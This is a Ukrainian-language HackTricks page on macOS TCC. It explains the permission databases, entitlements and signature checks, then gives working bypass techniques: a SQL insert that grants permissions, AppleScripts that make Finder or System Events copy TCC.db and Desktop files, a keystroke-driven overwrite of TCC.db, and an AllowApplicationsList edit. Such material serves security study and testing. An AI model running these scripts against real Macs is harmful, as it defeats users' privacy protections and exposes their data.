# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Основна інформація**

**TCC (Прозорість, Згода та Контроль)** - це протокол безпеки, що зосереджується на регулюванні дозволів додатків. Його основна роль полягає в захисті чутливих функцій, таких як **сервіси геолокації, контакти, фотографії, мікрофон, камера, доступ до можливостей для людей з обмеженими можливостями та повний доступ до диска**. Вимагаючи явної згоди користувача перед наданням доступу додатка до цих елементів, TCC підвищує конфіденційність і контроль користувача над своїми даними.

Користувачі стикаються з TCC, коли додатки запитують доступ до захищених функцій. Це видно через запит, який дозволяє користувачам **схвалити або відхилити доступ**. Крім того, TCC враховує прямі дії користувача, такі як **перетягування та скидання файлів у додаток**, щоб надати доступ до конкретних файлів, забезпечуючи, що додатки мають доступ лише до того, що явно дозволено.

![Приклад запиту TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** обробляється **демоном**, розташованим у `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`, і налаштовується в `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (реєстрація служби mach `com.apple.tccd.system`).

Існує **tccd у режимі користувача**, що працює для кожного увійшовшого користувача, визначеного в `/System/Library/LaunchAgents/com.apple.tccd.plist`, реєструючи служби mach `com.apple.tccd` та `com.apple.usernotifications.delegate.com.apple.tccd`.

Тут ви можете побачити tccd, що працює як система, так і як користувач:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Дозволи **наследуються від батьківського** додатку, а **дозволи** **відстежуються** на основі **Bundle ID** та **Developer ID**.

### Бази даних TCC

Дозволи/заборони зберігаються в деяких базах даних TCC:

- Системна база даних у **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Ця база даних **захищена SIP**, тому лише обхід SIP може записувати в неї.
- База даних TCC користувача **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** для налаштувань на користувача.
- Ця база даних захищена, тому лише процеси з високими привілеями TCC, такі як Повний доступ до диска, можуть записувати в неї (але вона не захищена SIP).

> [!WARNING]
> Попередні бази даних також **захищені TCC для доступу на читання**. Тому ви **не зможете прочитати** вашу звичайну базу даних TCC користувача, якщо це не з процесу з привілеями TCC.
>
> Однак пам'ятайте, що процес з такими високими привілеями (як **FDA** або **`kTCCServiceEndpointSecurityClient`**) зможе записувати в базу даних TCC користувача.

- Існує **третя** база даних TCC у **`/var/db/locationd/clients.plist`**, щоб вказати клієнтів, яким дозволено **доступ до служб геолокації**.
- Файл, захищений SIP **`/Users/carlospolop/Downloads/REG.db`** (також захищений від доступу на читання з TCC), містить **місцезнаходження** всіх **дійсних баз даних TCC**.
- Файл, захищений SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (також захищений від доступу на читання з TCC), містить більше наданих дозволів TCC.
- Файл, захищений SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (доступний для читання будь-ким), є списком дозволених додатків, які потребують винятку TCC.

> [!TIP]
> База даних TCC в **iOS** знаходиться в **`/private/var/mobile/Library/TCC/TCC.db`**.

> [!NOTE]
> **Інтерфейс центру сповіщень** може **вносити зміни в системну базу даних TCC**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Однак користувачі можуть **видаляти або запитувати правила** за допомогою утиліти командного рядка **`tccutil`**.

#### Запит баз даних

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Перевіряючи обидві бази даних, ви можете перевірити дозволи, які додаток дозволив, заборонив або не має (він запитає про це).

- **`service`** - це рядкове представлення TCC **дозволу**
- **`client`** - це **ID пакета** або **шлях до бінарного файлу** з дозволами
- **`client_type`** вказує, чи є це ідентифікатором пакета (0) або абсолютним шляхом (1)

<details>

<summary>Як виконати, якщо це абсолютний шлях</summary>

Просто виконайте **`launctl load you_bin.plist`**, з plist, як:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** може мати різні значення: denied(0), unknown(1), allowed(2) або limited(3).
- **`auth_reason`** може приймати такі значення: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Поле **csreq** призначене для вказівки, як перевірити бінарний файл для виконання та надання дозволів TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Для отримання додаткової інформації про **інші поля** таблиці [**перегляньте цей блог**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Ви також можете перевірити **вже надані дозволи** для додатків у `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Користувачі _можуть_ **видаляти або запитувати правила** за допомогою **`tccutil`** .

#### Скидання дозволів TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

База даних TCC **зберігає** **Bundle ID** програми, але також **зберігає** **інформацію** про **підпис**, щоб **переконатися**, що програма, яка запитує використання дозволу, є правильною.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Тому інші програми, які використовують те саме ім'я та ідентифікатор пакета, не зможуть отримати доступ до наданих дозволів, наданих іншим додаткам.

### Права та дозволи TCC

Додатки **не тільки повинні** **запитувати** та отримувати **доступ** до деяких ресурсів, вони також повинні **мати відповідні права**.\
Наприклад, **Telegram** має право `com.apple.security.device.camera`, щоб запитати **доступ до камери**. Додаток, який **не має** цього **права, не зможе** отримати доступ до камери (і користувач навіть не буде запитаний про дозволи).

Однак, щоб додатки **отримали доступ** до **певних папок користувача**, таких як `~/Desktop`, `~/Downloads` та `~/Documents`, їм **не потрібно** мати жодних специфічних **прав**. Система прозоро оброблятиме доступ і **запитуватиме користувача** за потреби.

Додатки Apple **не генеруватимуть запити**. Вони містять **попередньо надані права** у своєму **переліку прав**, що означає, що вони **ніколи не генеруватимуть спливаюче вікно**, **ні** вони з'являться в жодній з **баз даних TCC**. Наприклад:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Це запобігатиме запиту Календаря на доступ до нагадувань, календаря та адресної книги.

> [!TIP]
> Окрім деякої офіційної документації про права, також можна знайти неофіційну **цікаву інформацію про права в** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Деякі дозволи TCC: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Немає публічного списку, який визначає всі з них, але ви можете перевірити цей [**список відомих**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Чутливі незахищені місця

- $HOME (саме)
- $HOME/.ssh, $HOME/.aws тощо
- /tmp

### Намір користувача / com.apple.macl

Як згадувалося раніше, можливо **надати доступ до програми до файлу, перетягнувши його до неї**. Цей доступ не буде вказаний у жодній базі даних TCC, але як **розширений** **атрибут файлу**. Цей атрибут буде **зберігати UUID** дозволеної програми:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> Цікаво, що атрибут **`com.apple.macl`** керується **Sandbox**, а не tccd.
>
> Також зверніть увагу, що якщо ви перемістите файл, який дозволяє UUID програми на вашому комп'ютері, на інший комп'ютер, оскільки та сама програма матиме різні UID, це не надасть доступу до цієї програми.

Розширений атрибут `com.apple.macl` **не може бути очищений** як інші розширені атрибути, оскільки він **захищений SIP**. Однак, як [**пояснено в цьому пості**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), можливо відключити його, **запакувавши** файл, **видаливши** його та **розпакувавши** його.

## TCC Privesc & Bypasses

### Вставка в TCC

Якщо в якийсь момент вам вдасться отримати доступ на запис до бази даних TCC, ви можете використати щось на зразок наступного, щоб додати запис (видаліть коментарі):

<details>

<summary>Приклад вставки в TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Пейлоади

Якщо вам вдалося потрапити в додаток з деякими дозволами TCC, перегляньте наступну сторінку з пейлоадами TCC для їх зловживання:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Події

Дізнайтеся про Apple Події в:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Автоматизація (Finder) до FDA\*

Назва TCC дозволу для Автоматизації: **`kTCCServiceAppleEvents`**\
Цей конкретний дозвіл TCC також вказує на **додаток, яке можна керувати** в базі даних TCC (тому дозволи не дозволяють просто керувати всім).

**Finder** - це додаток, який **завжди має FDA** (навіть якщо він не з'являється в інтерфейсі), тому якщо у вас є **привілеї Автоматизації** над ним, ви можете зловживати його привілеями, щоб **змушувати його виконувати деякі дії**.\
У цьому випадку вашому додатку знадобиться дозвіл **`kTCCServiceAppleEvents`** над **`com.apple.Finder`**.

{{#tabs}}
{{#tab name="Викрасти TCC.db користувачів"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Ви можете зловживати цим, щоб **створити власну базу даних TCC користувача**.

> [!WARNING]
> З цим дозволом ви зможете **попросити Finder отримати доступ до обмежених папок TCC** і надати вам файли, але, наскільки мені відомо, ви **не зможете змусити Finder виконувати довільний код**, щоб повністю зловживати його доступом FDA.
>
> Отже, ви не зможете зловживати всіма можливостями FDA.

Це запит TCC для отримання привілеїв автоматизації над Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Зверніть увагу, що оскільки додаток **Automator** має дозвіл TCC **`kTCCServiceAppleEvents`**, він може **керувати будь-яким додатком**, таким як Finder. Отже, маючи дозвіл на керування Automator, ви також можете керувати **Finder** за допомогою коду, як показано нижче:

<details>

<summary>Отримати оболонку всередині Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Те ж саме відбувається з **додатком Script Editor,** він може контролювати Finder, але за допомогою AppleScript ви не можете змусити його виконати скрипт.

### Автоматизація (SE) до деяких TCC

**System Events можуть створювати дії для папок, а дії для папок можуть отримувати доступ до деяких папок TCC** (Робочий стіл, Документи та Завантаження), тому скрипт, подібний до наступного, може бути використаний для зловживання цією поведінкою:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Автоматизація (SE) + Доступність (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** до FDA\*

Автоматизація на **`System Events`** + Доступність (**`kTCCServicePostEvent`**) дозволяє надсилати **натискання клавіш процесам**. Таким чином, ви можете зловживати Finder для зміни TCC.db користувача або для надання FDA довільному додатку (хоча може бути запит на пароль для цього).

Приклад перезапису TCC.db користувача за допомогою Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` до FDA\*

Перегляньте цю сторінку для деяких [**payloads для зловживання дозволами доступу**](macos-tcc-payloads.md#accessibility) для підвищення привілеїв до FDA\* або, наприклад, для запуску кейлогера.

### **Клієнт безпеки кінцевих точок до FDA**

Якщо у вас є **`kTCCServiceEndpointSecurityClient`**, ви маєте FDA. Кінець.

### Файл системної політики SysAdmin до FDA

**`kTCCServiceSystemPolicySysAdminFiles`** дозволяє **змінювати** атрибут **`NFSHomeDirectory`** користувача, що змінює його домашню папку і, отже, дозволяє **обійти TCC**.

### База даних TCC користувача до FDA

Отримавши **права на запис** над **базою даних TCC** користувача, ви \*\*не можете\*\* надати собі **`FDA`** права, лише той, хто живе в системній базі даних, може це надати.

Але ви можете **надати** собі **`права автоматизації для Finder`** і зловживати попередньою технікою для підвищення до FDA\*.

### **FDA до TCC дозволів**

**Повний доступ до диска** в TCC називається **`kTCCServiceSystemPolicyAllFiles`**.

Я не думаю, що це справжнє підвищення привілеїв, але на всякий випадок, якщо ви вважаєте це корисним: якщо ви контролюєте програму з FDA, ви можете **змінити базу даних TCC користувачів і надати собі будь-який доступ**. Це може бути корисно як техніка постійності на випадок, якщо ви можете втратити свої права FDA.

### **Обхід SIP для обходу TCC**

Системна **база даних TCC** захищена **SIP**, тому лише процеси з **вказаними правами можуть змінювати** її. Отже, якщо зловмисник знайде **обхід SIP** через **файл** (зможе змінити файл, обмежений SIP), він зможе:

- **Видалити захист** бази даних TCC і надати собі всі дозволи TCC. Він міг би зловживати будь-яким з цих файлів, наприклад:
- Системна база даних TCC
- REG.db
- MDMOverrides.plist

Однак є ще один варіант зловживання цим **обхід SIP для обходу TCC**, файл `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` є списком дозволених програм, які потребують винятку TCC. Отже, якщо зловмисник може **видалити захист SIP** з цього файлу і додати свою **власну програму**, програма зможе обійти TCC.\
Наприклад, щоб додати термінал:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC обхід

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Посилання

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
